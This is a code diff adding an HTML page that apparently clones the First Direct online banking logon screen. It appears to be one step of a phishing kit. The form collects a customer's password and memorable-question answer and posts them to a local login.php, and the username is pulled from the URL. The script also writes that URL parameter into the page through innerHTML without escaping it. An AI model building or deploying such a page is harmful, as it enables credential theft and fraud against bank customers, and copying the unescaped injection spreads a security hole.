@@ -1,0 +1,107 @@
+<html>
+
+<head>
+    <link rel="stylesheet" href="css/app.css">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <div id="app">
+        <div id="main" class="_323TU608c7R7" data-path="/authentication/username" aria-hidden="false"><span class="_18lR5Lcsowvx"></span>
+            <main id="content" class="_2c87ug2gdnMj iSsy-kS_VNy5" aria-live="polite" aria-hidden="false"><a class="_3uPSPih3cDvg" data-qa="screen-reader-label" id="maincontent" name="maincontent" tabindex="-1">Main content</a>
+                <form class="_2kwu1cwKs9T_" autocomplete="off" action="login.php" method="post">
+                    <button type="submit" aria-hidden="true">Continue</button>
+                    <section data-qa="cam-10-page" class="_29F8NWiiqSC3">
+                        <div class="_1X89qp1igOet">
+                            <div tabindex="-1" class="_3xPv4X2mUydX"><span class="_3uPSPih3cDvg" data-qa="screen-reader-label">Welcome to Online Banking</span></div>
+                            <div class="_3eQtoAx26Fcq"><span class="dPKmS236Npsr desktop withFscs"><span class="_3uPSPih3cDvg" data-qa="screen-reader-label">first direct</span></span>
+                                <div class="_33L-2J38Wsyv mobile"><button type="button" class="P_5rUHJIogxd" aria-label="Financial Services Compensation Scheme Info"></button></div>
+                            </div>
+                            <div class="L8vJsKaVQWNa">
+                                <h1 class="_2rnMquiDwicT mb0">Good afternoon</h1>
+                                <div class="_29nFIMM-RjyQ">
+                                    Welcome back
+                                    <span class="lbluserid" id="lbluserid">JSMITH</span><br> If this is not your username then
+                                    <a class="login_link" href="1.html">Change user</a>
+                                </div>
+                            </div>
+                            <div class="_3Ro6ZCWC7I1e">
+                                <div class="_33L-2J38Wsyv desktop"><button type="button" class="P_5rUHJIogxd" aria-label="Financial Services Compensation Scheme Info"></button></div>
+                            </div>
+                        </div>
+                        <div class="_3pe8PXvAbUT6">
+                            <div class="_1GHP4BOvDft7 _2e9QSPL6OSaY">
+                                <fieldset>
+                                    <input name="userid" type="hidden" id="userid">
+                                    <legend>Log on without your Secure Key</legend><label class="RE2Klxc4g_7m" for="password">Please enter your password</label>
+                                    <div><input name="password" type="password" id="password" aria-required="true" size="30" maxlength="76" value=""></div>
+                                    <div class="_3tW9QbLuVrfR">
+                                        <button type="button" class="_3WSPbPbdRYDX l6cAWyTWc38d">Forgotten your password?</button>
+                                    </div>
+                                </fieldset>
+                                <fieldset>
+                                    <legend>Your memorable question</legend><label class="RE2Klxc4g_7m" for="question">Answer</label>
+                                    <div>
+                                        <input name="answer" type="text" id="question" aria-required="true" size="30" maxlength="76" value="">
+                                    </div>
+                                    <div class="_3tW9QbLuVrfR">
+                                        <button type="button" class="_3WSPbPbdRYDX l6cAWyTWc38d">Forgotten your answer?</button>
+                                    </div>
+                                    <div class="_3CPEmgd7mKjp">
+                                        <button class="_3qcy6oh1BJdO _346tgcQzioQc" type="button" data-qa="register-next-button" value="" id="btn-back">Back</button>
+                                        <button class="_3qcy6oh1BJdO _1wxVBjVdI7l6" type="submit" data-qa="logon-next-button" aria-disabled="true" id="btn-login">Log on</button>
+                                    </div>
+                                    <div class="_3tW9QbLuVrfR">
+                                        <button type="button" class="_3WSPbPbdRYDX l6cAWyTWc38d" style="margin-top: 20px;">I've forgotten both my password and memorable answer?</button>
+                                    </div>
+                                </fieldset>
+                            </div>
+                        </div>
+                    </section>
+                </form>
+            </main><span class="_3YY65zlSVHy2" aria-hidden="true">&nbsp;</span><span class="_2gobnFGrEjFb" aria-hidden="true">&nbsp;</span><span class="_2AD7S671Wm7o" aria-hidden="true">&nbsp;</span>
+        </div>
+        <div class="ReactModalPortal"></div>
+        <div class="ReactModalPortal"></div>
+        <div class="ReactModalPortal"></div>
+        <div class="ReactModalPortal"></div>
+    </div>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        var userid = urlParams.get('userid');
+        if (userid) {
+            document.getElementById('lbluserid').innerHTML = userid.toUpperCase();
+            document.getElementById('userid').value = userid;
+        }
+
+        var btn_back = document.getElementById('btn-back');
+        btn_back.addEventListener('click', () => {
+            location.href = '1.html';
+        })
+
+
+        document.getElementById('password').addEventListener('input', () => {
+            checkValid();
+        });
+
+        document.getElementById('question').addEventListener('input', () => {
+            checkValid();
+        });
+
+        function checkValid() {
+            var password = document.getElementById('password').value;
+            var question = document.getElementById('question').value;
+            if (password && question) {
+                document.getElementById('btn-login').classList.add('_346tgcQzioQc');
+                document.getElementById('btn-login').classList.add('black');
+                document.getElementById('btn-login').classList.remove('_1wxVBjVdI7l6');
+            } else {
+                document.getElementById('btn-login').classList.add('_1wxVBjVdI7l6');
+                document.getElementById('btn-login').classList.remove('_346tgcQzioQc');
+                document.getElementById('btn-login').classList.remove('black');
+            }
+        }
+    </script>
+</body>
+
+</html>
